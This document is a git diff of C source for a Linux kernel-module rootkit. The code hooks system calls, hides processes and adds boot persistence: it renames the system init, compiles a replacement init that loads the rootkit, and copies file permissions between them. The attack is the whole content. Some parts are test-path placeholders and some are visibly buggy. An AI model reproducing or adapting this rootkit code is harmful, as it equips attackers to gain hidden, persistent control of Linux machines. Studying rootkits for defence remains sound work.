@@ -37,12 +37,17 @@ char hidePID[6] = "-1";
 
 // this is the c file which will replace /sbin/init
 // - it loads the rootkit then runs the original /sbin/init
-#define FILE_INIT_REPLACEMENT_C "start_rootkit.c"
+#define FILE_INIT_REPLACEMENT_C "/vagrant/start_rootkit.c"
 // #define FILE_INIT               "/sbin/init"
 // #define FILE_INIT_ORIGINAL      "/sbin/init_original"
 
-#define FILE_INIT               "/vagrant/init_temp"
-#define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
+// #define FILE_INIT               "/vagrant/init_temp"
+// #define FILE_INIT_ORIGINAL      "/vagrant/init_temp_original"
+
+#define FILE_INIT               "/home/vagrant/fake_init"
+#define FILE_INIT_ORIGINAL      "/home/vagrant/fake_init_original"
+
+
 
 asmlinkage int (*original_sysinfo)(struct sysinfo *);
 asmlinkage int (*original_kill)(pid_t, int);
@@ -359,11 +364,88 @@ int rename_file(const char* filename_old, const char* filename_new) {
     return ret;
 }
 
+// 0 = doesn't, 1 = does
+// pretty hacky
+int does_file_exist(const char* filename) {
+    int ret;
+    struct file *filp = NULL;
+    // use user file system
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+
+    // error = doesn't exist? probably.
+    filp = filp_open(filename, O_RDONLY, 0);
+    if (IS_ERR(filp)) {
+        ret = 0;
+    } else {
+        filp_close(filp, NULL);
+        ret = 1;
+    }
+
+    // close old file system
+    set_fs(old_fs);
+
+    return ret;
+}
+
+// umode_t get_file_permissions(const char* filename) {
+//     struct kstat file_stat;
+//     vfs_stat(filename, &file_stat);
+//     // printk("st_mode mod: %o\n", file_stat.mode & 0x0FFF);
+//     printk("file_stat.mode: %o\n", file_stat.mode);
+//     printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
+//     return (file_stat.mode & 0x0FFF);
+// }
+
 umode_t get_file_permissions(const char* filename) {
-    struct kstat file_stat;
-     vfs_stat("/home/vagrant/start_rootkit", &file_stat);
-    // printk("st_mode mod: %o\n", file_stat.mode & 0x0FFF);
-    return file_stat.mode & 0x0FFF;
+    int ret;
+    struct file *filp = NULL;
+    // use user file system
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+
+    // error = doesn't exist? probably.
+    filp = filp_open(filename, O_RDONLY, 0);
+    if (IS_ERR(filp)) {
+        ret = -1;
+        set_fs(old_fs);
+        return;
+    }
+    
+    // [777]o === [511]d
+    // ret = filp->f_dentry->d_inode->i_mode & 511;
+    ret = filp->f_dentry->d_inode->i_mode;
+
+    filp_close(filp, NULL);
+    // close old file system
+    set_fs(old_fs);
+
+    return ret;
+}
+
+void set_file_permissions(const char* filename, int file_perms) {
+    int ret;
+    struct file *filp = NULL;
+    // use user file system
+    mm_segment_t old_fs = get_fs();
+    set_fs(get_ds());
+
+    // error = doesn't exist? probably.
+    filp = filp_open(filename, O_WRONLY, 0);
+    if (IS_ERR(filp)) {
+        ret = -1;
+        set_fs(old_fs);
+        return;
+    }
+    
+    // is this OK to do? maybe
+    ret = filp->f_dentry->d_inode->i_mode = file_perms;
+
+    filp_close(filp, NULL);
+    // close old file system
+    set_fs(old_fs);
+
+    return ret;
 }
 
 // runs a bash command
@@ -392,11 +474,13 @@ int run_bash(char* command) {
 // run (ideally)
 // - should this be done in our payload instead?
 //   doing file I/O is bad in kernel modules
+
+// also could have been done w/ other hidden program
 void add_to_reboot(void **sys_call_table) {
     //clone_file("/home/vagrant/dog.txt", "/home/vagrant/dog_copy.txt");
-    clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");
+    // clone_file("/home/vagrant/start_rootkit", "/home/vagrant/start_rootkit_copy");
 
-    rename_file("/home/vagrant/rename_me.txt", "/home/vagrant/rename_me_ok_then.txt");
+    // rename_file("/home/vagrant/rename_me.txt", "/home/vagrant/rename_me_ok_then.txt");
 
     // check for existence of /sbin/init_original
     // if (!access(FILE_INIT_ORIGINAL, R_OK) == 0) {
@@ -416,46 +500,45 @@ void add_to_reboot(void **sys_call_table) {
 
     // delete file if it exists ?
 
-    // keep file permissions ?
-    //sys_chmod("/home/vagrant/start_rootkit_copy", 0);
-    //use sys_stat to get original file perms
-    // sys_access("/home/avgrant/start_rootkit")
+    // check renamed init doesn't exist
 
-    //void* f_stat  = sys_call_table[__NR_stat];
-    //asmlinkage int (*f_stat)(const char *path, struct stat *buf) = &sys_call_table[__NR_stat];
-    //asmlinkage int (*f_chmod)(const char *pathname, mode_t mode) = &sys_call_table[__NR_chmod];
+    // int exists = does_file_exist(FILE_INIT_ORIGINAL);
+    // printk("file exists: %d", exists);
 
-    // struct stat f1_stat;
-    // DISABLE_W_PROTECTED_MEMORY
-    // // original_stat("/home/vagrant/start_rootkit", &f1_stat);
-    // // original_chmod("/home/vagrant/start_rootkit_copy", f1_stat.st_mode);
+    // struct kstat file_stat;
+    // vfs_stat("/home/vagrant/dog_copy.txt", &file_stat);
+    // printk("file_stat.mode: %o\n", file_stat.mode);
+    // printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
 
-    // // dst, src, size
-    // char* loc = "/home/vagrant/start_rootkit_copy";
-    // char* user_loc;
-    // copy_to_user(user_loc, loc, strlen(loc));
-    // original_chmod(user_loc, 5);
+    // vfs_stat("/home/vagrant/dog.txt", &file_stat);
+    // printk("file_stat.mode: %o\n", file_stat.mode);
+    // printk("file_stat.mode mod: %o\n", file_stat.mode & 0x0FFF);
 
-    // ENABLE_W_PROTECTED_MEMORY
+    int ret;
 
-    // char* argv[4];
-    // argv[0] = "bin/bash";
-    // argv[1] = "-c";
-    // argv[2] = "chmod 5 /home/vagrant/start_rootkit_copy > /home/vagrant/output.txt";
-    // argv[3] = NULL;
-    // // argv[0] = "bin/bash";
-    // // argv[1] = "-c";
-    // // argv[2] = "touch /home/vagrant/will_i_make_this >> /home/vagrant/output.txt";
-    // // argv[3] = NULL;
-    // char* envp[4];
-    // envp[0] = "HOME=/";
-    // envp[1] = "TERM=linux";
-    // envp[2] = "PATH=/sbin:/usr/sbin:/bin:/usr/bin";
-    // envp[3] = NULL;
-    // int res = call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
+    // store file permissions of original init
+    umode_t orig_perms = get_file_permissions(FILE_INIT);
 
-    int res = run_bash("chmod 5 /home/vagrant/start_rootkit_copy");
-    printk("result from chmod: %d", res);
+    // rename original init
+    rename_file(FILE_INIT, FILE_INIT_ORIGINAL);
 
-    printk(": %d", res);
+    // compile (/'copy' over replacement init)
+    char bash_compile[8 + strlen(FILE_INIT_REPLACEMENT_C) + strlen(FILE_INIT)];
+    sprintf(bash_compile, "gcc %s -o %s", FILE_INIT_REPLACEMENT_C, FILE_INIT);
+    printk("bash_compile: %s\n", bash_compile);
+    ret = run_bash(bash_compile);
+
+    set_file_permissions(FILE_INIT, orig_perms);
+    set_file_permissions(FILE_INIT_ORIGINAL, 777777);
+
+    // set file permissions of original init to stored
+    // char bash_perms_init[7 + 10 + strlen(FILE_INIT) + 25];
+    // sprintf(bash_perms_init, "sudo chmod %o %s &> output.txt", orig_perms, FILE_INIT);
+    // printk("bash_perms_init: %s\n", bash_perms_init);
+    // ret = run_bash(bash_perms_init);
+    // // set file permissions of replacement init to stored
+    // char* bash_perms_repl[7 + 10 + strlen(FILE_INIT_ORIGINAL)];
+    // sprintf(bash_perms_repl, "chmod %o %s", orig_perms, FILE_INIT_ORIGINAL);
+    // printk("bash_perms_repl: %s\n", bash_perms_repl);
+    // ret = run_bash(bash_perms_repl);
 }
